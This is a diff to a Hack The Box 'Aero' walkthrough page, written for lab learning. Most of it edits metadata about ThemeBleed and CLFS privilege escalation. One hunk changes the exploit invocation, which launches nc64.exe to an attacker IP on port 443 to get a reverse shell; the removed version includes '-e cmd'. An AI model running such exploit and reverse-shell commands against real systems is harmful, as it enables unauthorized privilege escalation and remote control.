@@ -1,12 +1,15 @@
 +++
-tags = ["Box", "HTB", "Medium", "Windows", "LDAP", "Active Directory", "CVE-2023-38146", "ThemeBleed", "CVE-2023-28252", "Persistence"]
+title = "Aero HTB Walkthrough: ThemeBleed and CLFS Exploitation"
 draft = false
-title = "Aero HTB Walkthrough"
+tags = ["Windows", "HTB", "Hack The Box", "CVE-2023-38146", "ThemeBleed", "CVE-2023-28252", "CLFS", "Windows 11", "Privilege Escalation", "IIS", "Persistence", "Registry Backdoor", "Scheduled Tasks"]
+keywords = ["Hack The Box Aero", "ThemeBleed exploitation", "CVE-2023-38146 walkthrough", "CLFS vulnerability", "Windows 11 theme exploitation", "CVE-2023-28252 tutorial", "Windows persistence techniques", "Registry backdoor methods", "Scheduled task persistence", "IIS security assessment"]
+description = "A detailed walkthrough of the Aero machine from Hack The Box, demonstrating exploitation of the ThemeBleed vulnerability (CVE-2023-38146) and CLFS (CVE-2023-28252). Learn about Windows 11 security mechanisms, advanced persistence techniques using registry modifications and scheduled tasks."
 author = "bloodstiller"
 date = 2024-11-05
 toc = true
 bold = true
 next = true
+lastmod = 2024-11-05
 +++
 
 ## Aero Hack The Box Walkthrough/Writeup: {#aero-hack-the-box-walkthrough-writeup}
@@ -311,7 +314,7 @@ So as it looks like this host is vulnerable to this specific exploit (well its i
     -   {{< figure src="/ox-hugo/2024-11-04-194636_.png" >}}
 
 -   **I trigger exploit and pass n64.exe as an argument**:
-    -   `.\ex.exe 1208 1 "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 443 -e cmd"`
+    -   `.\ex.exe 1208 1 "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 443"`
     -   {{< figure src="/ox-hugo/2024-11-04-194705_.png" >}}
     -   **High level Command Breakdown**:
         -   `.\ex.exe`: The compiled exploit executable
